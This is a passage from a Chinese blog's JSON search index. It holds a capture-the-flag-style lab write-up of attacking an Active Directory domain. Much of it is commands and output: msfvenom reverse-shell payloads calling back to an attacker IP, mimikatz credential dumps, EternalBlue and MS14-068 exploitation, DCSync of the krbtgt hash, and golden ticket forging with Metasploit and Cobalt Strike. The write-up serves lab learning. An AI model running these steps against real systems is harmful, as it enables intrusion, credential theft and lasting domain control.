src=\"nfVutje3dHIh4-dp6utiEXI8mD2xSYQ_-TZxOYwFfnk.png\" alt=\"image\"></p>\n<h1 id=\"4metasploit-进行提权和信息收集\"><a href=\"#4metasploit-进行提权和信息收集\" class=\"headerlink\" title=\"4metasploit 进行提权和信息收集\"></a>4metasploit 进行提权和信息收集</h1><h2 id=\"4-1-生成攻击载荷\"><a href=\"#4-1-生成攻击载荷\" class=\"headerlink\" title=\"4.1.生成攻击载荷\"></a>4.1.生成攻击载荷</h2><p>phpstudy套件是默认是系统权限的直接上传执行exe就是高权限了</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.8.133 lport=12345 -f exe &gt;s.exe</span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"4-2监听上线\"><a href=\"#4-2监听上线\" class=\"headerlink\" title=\"4.2监听上线\"></a>4.2监听上线</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">msf6 &gt; use exploit/multi/handler</span><br><span class=\"line\">msf6 exploit(multi/handler) &gt; <span class=\"built_in\">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class=\"line\">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class=\"line\">msf6 exploit(multi/handler) &gt; <span class=\"built_in\">set</span> lhost 192.168.8.133</span><br><span class=\"line\">lhost =&gt; 192.168.8.133</span><br><span class=\"line\">msf6 exploit(multi/handler) &gt; <span class=\"built_in\">set</span> lport 12345</span><br><span class=\"line\">lport =&gt; 12345</span><br><span class=\"line\">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>\n<p><img src=\"Y1jsXOo3u_JYtZJJocCa_yJm1vo8FoyUQy5ma8TO9F4.png\" alt=\"image\"></p>\n<p>得到了系统权限</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">meterpreter &gt; getuid</span><br><span class=\"line\">Server username: NT AUTHORITY\\SYSTEM</span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"4-3migrate-迁移进程\"><a href=\"#4-3migrate-迁移进程\" class=\"headerlink\" title=\"4.3migrate 迁移进程\"></a>4.3migrate 迁移进程</h2><p>migrate 迁移到64位进程里 migrate 592进行到 system 方便我们的操作</p>\n<p><img src=\"vxqPUE2LapBE8bh_7MbKCsszL9OnQNhUcPuVzzeVbAQ.png\" alt=\"image\"></p>\n<h2 id=\"4-4-mimikatz-哈希明文获取\"><a href=\"#4-4-mimikatz-哈希明文获取\" class=\"headerlink\" title=\"4.4.mimikatz 哈希明文获取\"></a>4.4.mimikatz 哈希明文获取</h2><p>哈希明文获取</p>\n<p>加载kiwi模块</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">meterpreter &gt; load kiwi</span><br><span class=\"line\">meterpreter &gt; creds_all</span><br></pre></td></tr></table></figure>\n<p><img src=\"AgzpdnnXMXXE-YWNjtqGlWGcXe3MXsTL4nom3T8Ofhg.png\" alt=\"image\"></p>\n<p><img src=\"-npcjJVrPR436eyt70ApDYqejQ4a4uaBxIFQlNhorew.png\" alt=\"image\"></p>\n<p>看到有hackbox域 用户web 本地管理员</p>\n<p>Administrator 密码 !@#Qwe456</p>\n<p> </p>\n<h1 id=\"5-跨网段域渗透\"><a href=\"#5-跨网段域渗透\" class=\"headerlink\" title=\"5.跨网段域渗透\"></a>5.跨网段域渗透</h1><h2 id=\"5-1-metasploit-跨网段的域渗透\"><a href=\"#5-1-metasploit-跨网段的域渗透\" class=\"headerlink\" title=\"5.1.metasploit 跨网段的域渗透\"></a>5.1.metasploit 跨网段的域渗透</h2><p>这里我将用两个内网渗透神器进行域渗透下的域渗透分别是 </p>\n<p>metasploit 和 cobalt strike4.0</p>\n<h3 id=\"5-1-1确定域环境\"><a href=\"#5-1-1确定域环境\" class=\"headerlink\" title=\"5.1.1确定域环境\"></a>5.1.1确定域环境</h3><p>切为adminstrator</p>\n<p><img src=\"yyu5NdYEUMNelTNr5Ms9jd5MilsGhNAKJ7LWSzL8enY.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Shell</span><br><span class=\"line\">Chcp 65001</span><br><span class=\"line\">net config workstation</span><br></pre></td></tr></table></figure>\n<p><img src=\"3wsnskXgIQdwxq28Xb6C-xl0ienu4Unb19yUg11icAQ.png\" alt=\"image\"></p>\n<h3 id=\"5-1-2定位域控\"><a href=\"#5-1-2定位域控\" class=\"headerlink\" title=\"5.1.2定位域控\"></a>5.1.2定位域控</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">run post/windows/gather/enum_domain</span><br></pre></td></tr></table></figure>\n<p><img src=\"P6SuC7n7Dk7c_mj2KW6laAqoNGI925x1o0iuyBHmSks.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">run post/windows/gather/enum_ad_computers</span><br></pre></td></tr></table></figure>\n<p><img src=\"6T3kQNHqAMUvO0WbOTvDiJthOWDFsDUtketvpMV5SqU.png\" alt=\"image\"></p>\n<h3 id=\"5-1-3域信息收集\"><a href=\"#5-1-3域信息收集\" class=\"headerlink\" title=\"5.1.3域信息收集\"></a>5.1.3域信息收集</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">net time /domain 查看域控时间 </span><br><span class=\"line\">net view 遍历信任主机 </span><br><span class=\"line\">net view /domain 查看域</span><br><span class=\"line\">net view /domain:hackbox</span><br></pre></td></tr></table></figure>\n<p><img src=\"Le1HaCAL9c-M5tJnht8BQfAESH-2JkGHqarqIviIhwc.png\" alt=\"image\"></p>\n<p><img src=\"p25XRa8UlwVAaTdlQq4NMrGH00teWjp7fEMkjPIbfeg.png\" alt=\"image\"></p>\n<p>查看域组失败 其他查看组信息均失败</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">net group /domain</span><br><span class=\"line\">ifconfig得到两个IP段</span><br><span class=\"line\">10.10.10.150 </span><br><span class=\"line\">192.168.8.83</span><br></pre></td></tr></table></figure>\n<p><img src=\"qmFc83FlxY6CaWKPvuWodYs3irHV2ysmibFj19WOT9c.png\" alt=\"image\"></p>\n<p>Arp</p>\n<p><img src=\"oSPO8CtX6NFu17pbJX1O2KM4fkY6-JztpQ1UtpmRHpU.png\" alt=\"image\"></p>\n<h3 id=\"5-1-4终端设置乱码\"><a href=\"#5-1-4终端设置乱码\" class=\"headerlink\" title=\"5.1.4终端设置乱码\"></a>5.1.4终端设置乱码</h3><p>在metasploit终端使用shell返回的信息会有乱码，可以设置编码防止乱码</p>\n<p>chcp 65001</p>\n<h3 id=\"5-1-5终端执行命令信息收集命令\"><a href=\"#5-1-5终端执行命令信息收集命令\" class=\"headerlink\" title=\"5.1.5终端执行命令信息收集命令\"></a>5.1.5终端执行命令信息收集命令</h3><p><img src=\"5C_weWwdH8vxRZd3ZByyQ3mwnRDeuK2t15YV8O-Sp9A.png\" alt=\"image\"></p>\n<p>dns 10.10.10.149</p>\n<p>dns 一般都是与域控同一个 ip</p>\n<table>\n<thead>\n<tr>\n<th><br>DC<br></th>\n<th><br>10.10.10.149<br></th>\n</tr>\n</thead>\n<tbody><tr>\n<td><br>WEB<br></td>\n<td><br>10.10.10.150<br></td>\n</tr>\n</tbody></table>\n<h3 id=\"5-1-6获取登录过的用户信息\"><a href=\"#5-1-6获取登录过的用户信息\" class=\"headerlink\" title=\"5.1.6获取登录过的用户信息\"></a>5.1.6获取登录过的用户信息</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">run post/windows/gather/enum_logged_on_users</span><br></pre></td></tr></table></figure>\n<p><img src=\"jNHAr7xW78eOfN0zz6beBPJH17EWTtofkbeXilHdHPc.png\" alt=\"image\"></p>\n<h3 id=\"5-1-7添加路由渗透-DC-域控\"><a href=\"#5-1-7添加路由渗透-DC-域控\" class=\"headerlink\" title=\"5.1.7添加路由渗透 DC 域控\"></a>5.1.7添加路由渗透 DC 域控</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">run autoroute -s 10.10.10.0/24</span><br></pre></td></tr></table></figure>\n<p><img src=\"PSwJTJ4tyDY5McjoN9Ki0QGom3DONJ2F-5XG8jEvm1k.png\" alt=\"image\"></p>\n<h3 id=\"5-1-8开启代理\"><a href=\"#5-1-8开启代理\" class=\"headerlink\" title=\"5.1.8开启代理\"></a>5.1.8开启代理</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">use auxiliary/server/socks_proxy</span><br></pre></td></tr></table></figure>\n<p><img src=\"34aWfE75OU_I26bi06fVcrK1hQBFjCTjPQ00WWkoCZk.png\" alt=\"image\"></p>\n<p><img src=\"Sh6E5ph4rxwcOSRD5iMsM3_ic2fSxj3Mdb0mrh8MzX0.png\" alt=\"image\"></p>\n<p><img src=\"4ESfU2ziSKMIAK1MvlMNm7d-U2ZE7GRAWJLvhdUNP8Y.png\" alt=\"image\"></p>\n<h3 id=\"5-1-9-设置-porychanins-代理-nmap-扫描\"><a href=\"#5-1-9-设置-porychanins-代理-nmap-扫描\" class=\"headerlink\" title=\"5.1.9.设置 porychanins 代理 nmap 扫描\"></a>5.1.9.设置 porychanins 代理 nmap 扫描</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>\n<p><img src=\"E1C5gP-D9eVV5JAYhdUPCTjqOhj4J_JkV5XpGUA-24U.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 nmap -sT -Pn 10.10.10.149</span><br></pre></td></tr></table></figure>\n<p><img src=\"MyQOUDvy8b59qAMJu22ET__edu8PlynoZ3BoM0_xVeM.png\" alt=\"image\"></p>\n<h3 id=\"5-1-10永恒之蓝-ms17-010-进行溢出\"><a href=\"#5-1-10永恒之蓝-ms17-010-进行溢出\" class=\"headerlink\" title=\"5.1.10永恒之蓝 ms17_010 进行溢出\"></a>5.1.10永恒之蓝 ms17_010 进行溢出</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">meterpreter &gt; background</span><br><span class=\"line\">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class=\"line\"><span class=\"built_in\">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class=\"line\"><span class=\"built_in\">set</span> rhost 10.10.10.149</span><br><span class=\"line\">show options</span><br></pre></td></tr></table></figure>\n<p><img src=\"tWXdRvoF3_dmkttVM99mkbVyorKl-sqyq91lWbXLFkg.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Run</span><br></pre></td></tr></table></figure>\n<p><img src=\"y9nGhPCQap8Gl8HMWlGfX8vndyF5AnDYlN0EvABM9k4.png\" alt=\"image\"></p>\n<p>溢出成功</p>\n<h3 id=\"5-1-11ms14-068-的条件\"><a href=\"#5-1-11ms14-068-的条件\" class=\"headerlink\" title=\"5.1.11ms14-068 的条件\"></a>5.1.11ms14-068 的条件</h3><p>使用这个 exp 需要一个普通域控用户 </p>\n<p>web 是域用户 但是不知道密码</p>\n<h3 id=\"5-1-12开启远程桌面\"><a href=\"#5-1-12开启远程桌面\" class=\"headerlink\" title=\"5.1.12开启远程桌面\"></a>5.1.12开启远程桌面</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">run post/windows/manage/enable_rdp </span><br><span class=\"line\">rdesktop 192.168.0.150</span><br></pre></td></tr></table></figure>\n<p><img src=\"W8iXkr7VPJtEB1gUA6haROmKv147CNHJG7DN17ZJEhg.png\" alt=\"image\"></p>\n<p><img src=\"k_py3EVOPPpcpGfdHEcnOvm-RvOCGNu5mJDhy0ABRfI.png\" alt=\"image\"></p>\n<p>密码应该是对的 但不是远程组而已</p>\n<p> </p>\n<h3 id=\"5-1-13ms14-068-提权域控\"><a href=\"#5-1-13ms14-068-提权域控\" class=\"headerlink\" title=\"5.1.13ms14-068 提权域控\"></a>5.1.13ms14-068 提权域控</h3><h4 id=\"5-1-13-1-ms14-068-exe-创建票据\"><a href=\"#5-1-13-1-ms14-068-exe-创建票据\" class=\"headerlink\" title=\"5.1.13.1. ms14-068.exe 创建票据\"></a>5.1.13.1. ms14-068.exe 创建票据</h4><p>这些信息从 metasploit 前期信息来的，可以翻到上面查看</p>\n<p>使用菜刀上传到受害机器</p>\n<p><img src=\"SexlECvEaDYCrs0erB3Pl31wdMWEqG68780aGvgLVp0.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> C:/phpstudy_pro/WWW/www.webhack123.com/Public/Upload/20211103/</span><br><span class=\"line\">执行命令：</span><br><span class=\"line\">ms14-068.exe -u web@hackbox.com -s</span><br><span class=\"line\">S-1-5-21-2005268815-658469957-1189185684-1103 -d 10.10.10.149 -p !@<span class=\"comment\">#Qwe456</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"EIAO4bwaXHOhIu9UvZERfLSxAnXiAKERHUzAE1Rvl2I.png\" alt=\"image\"></p>\n<h4 id=\"5-1-13-2载入-kiwi\"><a href=\"#5-1-13-2载入-kiwi\" class=\"headerlink\" title=\"5.1.13.2载入 kiwi\"></a>5.1.13.2载入 kiwi</h4><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">load kiwi</span><br></pre></td></tr></table></figure>\n<p><img src=\"M-o7MQeL12DzMG1wvmCa2u5VSkxOu18AYeRE1EHfrus.png\" alt=\"image\"></p>\n<h4 id=\"5-1-13-3清理票据\"><a href=\"#5-1-13-3清理票据\" class=\"headerlink\" title=\"5.1.13.3清理票据\"></a>5.1.13.3清理票据</h4><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kerberos_ticket_purge 清理票据</span><br></pre></td></tr></table></figure>\n<p><img src=\"CPLWC9B2hnq3UoECD_ST6_zMG_Ozwo6n_QAJMLZhMZc.png\" alt=\"image\"></p>\n<p>5.1.13.4导入票据</p>\n<p>在 metasploit mimikatz 好似没有这个功能。</p>\n<p>上传 mimikatz 注入票据</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">mimikatz <span class=\"comment\"># kerberos::ptc TGT_web@hackbox.com.ccache</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"vExZpZamGKbFos_ePsdqQnSCR6ZSXVC3KTsq5dlzU5A.png\" alt=\"image\"></p>\n<p>Klist 查看当前票据</p>\n<p><img src=\"wFGukbDksiuTa8ZSLyh8DUzhzTbAmaYlIvEiZn-Uq4w.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">dir</span> \\\\dc\\c$    访问dc域控</span><br></pre></td></tr></table></figure>\n<p><img src=\"yheyjLEctfgFc5BxW_6lVxaVQ15jefkuaR82chcu-dI.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">net time \\\\dc</span><br></pre></td></tr></table></figure>\n<p><img src=\"oquR7XzwO2JEcyiWxiGDJviR7WsQlOpfcIeoF5a18o0.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">at \\\\dc</span><br><span class=\"line\">net time \\\\dc</span><br></pre></td></tr></table></figure>\n<p><img src=\"Ys2chERZyaU0YRhtmARMllSCpzTH-wc0Ja17KEaSP-E.png\" alt=\"image\"></p>\n<h3 id=\"5-1-14-获取-dc-域控权限\"><a href=\"#5-1-14-获取-dc-域控权限\" class=\"headerlink\" title=\"5.1.14. 获取 dc 域控权限\"></a>5.1.14. 获取 dc 域控权限</h3><h4 id=\"5-1-14-1-生成正向载荷\"><a href=\"#5-1-14-1-生成正向载荷\" class=\"headerlink\" title=\"5.1.14.1. 生成正向载荷\"></a>5.1.14.1. 生成正向载荷</h4><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows/meterpreter/bind_tcp lport=13777 -f exe &gt;`<span class=\"built_in\">pwd</span>`/bind.exe</span><br></pre></td></tr></table></figure>\n<h4 id=\"5-1-14-2-copy-复制到域控\"><a href=\"#5-1-14-2-copy-复制到域控\" class=\"headerlink\" title=\"5.1.14.2. copy 复制到域控\"></a>5.1.14.2. copy 复制到域控</h4><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">c:\\phpstudy_pro\\WWW\\www.webhack123.com&gt;copy bind.exe \\\\dc\\C$\\ copy bind.exe \\\\dc\\C$\\ </span><br></pre></td></tr></table></figure>\n<h4 id=\"5-1-14-3-at-执行任务运行-exe\"><a href=\"#5-1-14-3-at-执行任务运行-exe\" class=\"headerlink\" title=\"5.1.14.3. at 执行任务运行 exe\"></a>5.1.14.3. at 执行任务运行 exe</h4><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Windows\\system32&gt;at \\\\dc 0:27:00 c:/bind.exe</span><br><span class=\"line\">at \\\\dc 0:27:00 c:/bind.exe</span><br></pre></td></tr></table></figure>\n<p><img src=\"EqsLbDehJeczCRv-cDhDcRHg9w9lPoGOjeYla4aqwO4.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">set</span> payload windows/meterpreter/bind_tcp</span><br><span class=\"line\"><span class=\"built_in\">set</span> rhost 10.10.10.149</span><br><span class=\"line\"><span class=\"built_in\">set</span> lport 13777</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<p><img src=\"DuFNjezYzFUr46HtyOrGONZI9aOfF8dUM7TnTmqACx8.png\" alt=\"image\"></p>\n<h3 id=\"5-1-15获取-dc-域控哈希明文\"><a href=\"#5-1-15获取-dc-域控哈希明文\" class=\"headerlink\" title=\"5.1.15获取 dc 域控哈希明文\"></a>5.1.15获取 dc 域控哈希明文</h3><p>进程迁移</p>\n<p><img src=\"u0o8-m-V0ej8DN56676H3_mV04yZ57kNpeVDjdJ83cE.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">run hashdump</span><br></pre></td></tr></table></figure>\n<p><img src=\"MBSM42CqWl-xFyGjZlAJcinJ8ikEwd14i7cRPpcFHUU.png\" alt=\"image\"></p>\n<h3 id=\"5-1-16-抓域控全部-hash\"><a href=\"#5-1-16-抓域控全部-hash\" class=\"headerlink\" title=\"5.1.16. 抓域控全部 hash\"></a>5.1.16. 抓域控全部 hash</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">run post/windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure>\n<p><img src=\"NMqzFe5L9OOVq9C9rfBEZAVzv279q3T4-jkKCTdj0s0.png\" alt=\"image\"></p>\n<h3 id=\"5-1-17制作黄金票据\"><a href=\"#5-1-17制作黄金票据\" class=\"headerlink\" title=\"5.1.17制作黄金票据\"></a>5.1.17制作黄金票据</h3><p>考虑长期权维护，还是做一个黄金票据比较保险。</p>\n<p> </p>\n<h3 id=\"5-1-18获取-ntml-sid-rid\"><a href=\"#5-1-18获取-ntml-sid-rid\" class=\"headerlink\" title=\"5.1.18获取 ntml sid rid\"></a>5.1.18获取 ntml sid rid</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">wmic useraccount <span class=\"built_in\">where</span> name=<span class=\"string\">&quot;krbtgt&quot;</span> get sid</span><br><span class=\"line\">S-1-5-21-2005268815-658469957-1189185684-502</span><br></pre></td></tr></table></figure>\n<p><img src=\"62iCaNpvd2-OA1TpN-5xs69bnwYZX5ycdXbx2smZ-UM.png\" alt=\"image\"></p>\n<h3 id=\"5-1-19窃取-域控超级管理权限\"><a href=\"#5-1-19窃取-域控超级管理权限\" class=\"headerlink\" title=\"5.1.19窃取 域控超级管理权限\"></a>5.1.19窃取 域控超级管理权限</h3><p>系统权限没办法做dcsync 所以切换域管理权限</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">steal_token 2264</span><br><span class=\"line\">dcsync_ntlm krbtgt</span><br></pre></td></tr></table></figure>\n<p><img src=\"8NN4jFntUF57QFH2dcJ4Ew3y1p0X3WVedFR5OmdTxTE.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">[+] Account   : krbtgt</span><br><span class=\"line\">[+] NTLM Hash : 6f60ace6accbcb76078ccc0312174e98</span><br><span class=\"line\">[+] LM Hash   : 36588bd35fd1fe85ec5fd73a1ca6805b</span><br><span class=\"line\">[+] SID       : S-1-5-21-2005268815-658469957-1189185684-502</span><br><span class=\"line\">[+] RID       : 502</span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"5-1-20生成黄金票据\"><a href=\"#5-1-20生成黄金票据\" class=\"headerlink\" title=\"5.1.20生成黄金票据\"></a>5.1.20生成黄金票据</h3><p>golden_ticket_create -d &lt;域名&gt; -u &lt;任意用户名&gt; -s <Domain sid> -k <krbtgt ntlm hash> -t &lt;ticket 本地存储路径如:&#x2F;tmp&#x2F;krbtgt.ticket&gt;</krbtgt></Domain></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">golden_ticket_create -d hackbox.com -u garck -s S-1-5-21-2005268815-658469957-1189185684 -k 6f60ace6accbcb76078ccc0312174e98 -t /tmp/krbtgt.ticket</span><br></pre></td></tr></table></figure>\n<p><img src=\"zFGUuFg7HaT8xvyiqgzxpkgr3KvvPXgoZeHbRck0b_c.png\" alt=\"image\"></p>\n<h3 id=\"5-1-21-注入黄金票据\"><a href=\"#5-1-21-注入黄金票据\" class=\"headerlink\" title=\"5.1.21. 注入黄金票据\"></a>5.1.21. 注入黄金票据</h3><p>切换到 web 服务器 把凭据都清理掉</p>\n<p>load kiwi</p>\n<p>kerberos_ticket_purge</p>\n<p><img src=\"frsYIOclYsljOKQ_NL_Urpl9gGH4Za9q4pO3o6nav6w.png\" alt=\"image\"></p>\n<p>注入黄金票据</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kerberos_ticket_use /tmp/krbtgt.ticket </span><br><span class=\"line\"><span class=\"built_in\">dir</span> \\\\dc\\c$</span><br></pre></td></tr></table></figure>\n<p><img src=\"SdA2-1uR6_vOkisvDPJAgF4MiXp6UUrNErRbcVpUugA.png\" alt=\"image\"></p>\n<p> </p>\n<p> </p>\n<h2 id=\"5-2cobaltstrike-进行内网域渗透\"><a href=\"#5-2cobaltstrike-进行内网域渗透\" class=\"headerlink\" title=\"5.2cobaltstrike 进行内网域渗透\"></a>5.2cobaltstrike 进行内网域渗透</h2><h3 id=\"5-2-1-建立-teamserver\"><a href=\"#5-2-1-建立-teamserver\" class=\"headerlink\" title=\"5.2.1.建立 teamserver\"></a>5.2.1.建立 teamserver</h3><p>.&#x2F;teamserver 192.168.8133 4477</p>\n<p>设置好监听器，密码是garck</p>\n<p><img src=\"u-Q8q58BpsZjSI0ROkj8XX9u7X3EMkpgV0W71710qG4.png\" alt=\"image\"></p>\n<p>在windows打开start.bat</p>\n<p><img src=\"R9iahA4Tb3atyzJEdPMNuF-OX-o6wT3jR-HvgOJ_DLE.png\" alt=\"image\"></p>\n<p>连接上之后，查看监听器。全选之后进行删除。</p>\n<p><img src=\"aKF8Q4X85DoVqaqTsCbX-8jEw3D2AulOZMKKzSbu2yU.png\" alt=\"image\"></p>\n<p>添加</p>\n<p><img src=\"G6skbVa1ApWCy_7vB9mRMnNCE1ZwTyvOf2F-er4ujvM.png\" alt=\"image\"></p>\n<p><img src=\"5r0rzTaria0jasqvwxy98GPNhai5EaaCo_NZgR6l3vE.png\" alt=\"image\"></p>\n<p>添加监听</p>\n<p><img src=\"yGzdl7I6VR9qBm7owT2KpBr6kgdnN1ZPaT705uW7eFU.png\" alt=\"image\"></p>\n<p>生成shellcode</p>\n<p><img src=\"T2nM21iTAMSIbCZLTeX4fzOC1MVev41QMFXqXt-R94k.png\" alt=\"image\"></p>\n<p><img src=\"MxJikiQrkwhKLqIMWvaFK00M4MhLbDc_ce9cUl4KOtk.png\" alt=\"image\"></p>\n<p>保存之后，使用菜刀进行上传至目标服务器。</p>\n<p>执行之后，设置时间为0秒</p>\n<p><img src=\"yKcsK5s97h1tnWenrQj_LerdmVCsBvSZy_hkKXdKOQU.png\" alt=\"image\"></p>\n<p><img src=\"KV3dgaTfC0rmzdw8ZKPrHzRggGtQ3ZW0gHPgMN_nV08.png\" alt=\"image\"></p>\n<p><img src=\"rFU-eUopnDduTOzor2Ig-aW-80OOA6krqGYQbSw999M.png\" alt=\"image\"></p>\n<p>查看</p>\n<p><img src=\"BZm0L6WL4kMgCdgcyBBgVhaE8JzZYWkyVnkoR4ngm1I.png\" alt=\"image\"></p>\n<p>获取目标信任主机</p>\n<p><img src=\"79F5Fj4hzWBkyB5WpRuXQE7lJAON0qePnvytxhzxWsE.png\" alt=\"image\"></p>\n<p> cobaltstrike mimikatz web 服务获取明密文</p>\n<p><img src=\"mA0wDxcU4g9fbpWd3y125Ku0uzn3uOxa399_fJXbNvA.png\" alt=\"image\"></p>\n<p> 查看明文</p>\n<p><img src=\"XhKg3MXmMCuj1MzJxUj2idVo80MeUQog61MFOyVsdHg.png\" alt=\"image\"></p>\n<p> dir访问域控DC</p>\n<p><img src=\"VQ3s7r-SOQb2iLfD4brj9RTvSgV2cWGQgJyZeJknqPQ.png\" alt=\"image\"></p>\n<p>在 py 脚本下创建票据</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@kali:~/Desktop/webhack123/pykek<span class=\"comment\"># set +H</span></span><br><span class=\"line\">root@kali:/Desktop/webhack123/pykek<span class=\"comment\"># proxychains python ms14-068.py -u web@hackbox.com -s S-1-5-21-2005268815-658469957-1189185684-1103 -d 10.10.10.149 -p !@#Qwe45</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"IhiC0Zp6jOCjmKTo6cTmvMD4rnE-gVfd39yjTfXQeTg.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">KrbCredExport 将 .ccache 文件转化为 kirbi 格式</span><br></pre></td></tr></table></figure>\n<p><img src=\"9AT_1I_2qT6nKyblCU-EpBMjgKfvcDVgJpdj9cFfDKE.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">导入票据访问 dc</span><br><span class=\"line\">导入票据 </span><br><span class=\"line\">kerberos_ticket_use C:\\user.ticket</span><br></pre></td></tr></table></figure>\n<p><img src=\"nZW70taEOK9-l4__g3sIl4xiXvs6r0NlAd5xU8YQz9A.png\" alt=\"image\"></p>\n<p>获取 dc 域控权限 </p>\n<p>现在只有访问 dc 域控的权限，接下来是 dc 域控的控制</p>\n<p> 设置 smb 连接器</p>\n<p><img src=\"3wEcr-sKIX8RWzRw_PSh_dLR6HltQNXLoglXL2Sr5ZE.png\" alt=\"image\"></p>\n<p>生成后门文件 选择 smb 因为是正向连接 如果使用反向链接 需要做转发 比较麻烦</p>\n<p><img src=\"LFSYccUwPXtUVA3GeJ2Gp-gfGE-T3_5be21q25c8LNE.png\" alt=\"image\"></p>\n<p>复制文件到 dc 域控并运行</p>\n<p><img src=\"oWN7ziYXSnOwmxX08zYI0k8pmtmmfwC2ianXvAUxF94.png\" alt=\"image\"></p>\n<p>在 beacon 正向连接上 dc </p>\n<p>link dc</p>\n<p><img src=\"b2AdoNhpPRREAnlU-u2HrgHlXIvyXAbUbmfE5p-UvzU.png\" alt=\"image\"></p>\n<p>获取 dc 明文哈希 </p>\n<p>命令输入 mimikatz hashdum</p>\n<p><img src=\"qYnk7cdpbpflPo5Hxcn5poGzbM1IA7m_UxSVF8LFCDI.png\" alt=\"image\"></p>\n<p><img src=\"Lg-KTweC8rhCZG9AZKRtDzqQ5wqli1nibNrNwJtPUMo.png\" alt=\"image\"></p>\n","categories":["打靶日记（moon）"],"tags":["红队","域渗透","打点"]},{"title":"打靶日记（五） 渗透高度安全的内网域控","url":"/2021/12/22/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%94%EF%BC%89%20%E6%B8%97%E9%80%8F%E9%AB%98%E5%BA%A6%E5%AE%89%E5%85%A8%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%8E%A7/","content":"<h1 id=\"打靶日记（五）-渗透高度安全的内网域控\"><a href=\"#打靶日记（五）-渗透高度安全的内网域控\" class=\"headerlink\" title=\"打靶日记（五） 渗透高度安全的内网域控\"></a>打靶日记（五） 渗透高度安全的内网域控</h1><p><strong>声明：此系列文章系个人记录打靶过程的文章，靶场为暗月师傅的靶场。这是第五篇。</strong></p>\n<h1 id=\"1-环境介绍\"><a href=\"#1-环境介绍\" class=\"headerlink\" title=\"1.环境介绍\"></a>1.环境介绍</h1><h2 id=\"1-1环境介绍\"><a href=\"#1-1环境介绍\" class=\"headerlink\" title=\"1.1环境介绍\"></a>1.1环境介绍</h2><p>本次靶场是一个高度安全的域控环境，存在多个防火墙，所以存在多个 dmz， 能有效隔离保护各个工作区。红队测试人员 需要从互联网从对外网 WEB 服务器 进行测试再进入内网服务器，进行资产收集，再渗透核心区域，打穿 AD 域控， 拿到域控的权限。本次靶场测试用到很多内网穿透技术，绕过杀软等红队技术。</p>\n<h2 id=\"1-2环境拓扑图\"><a 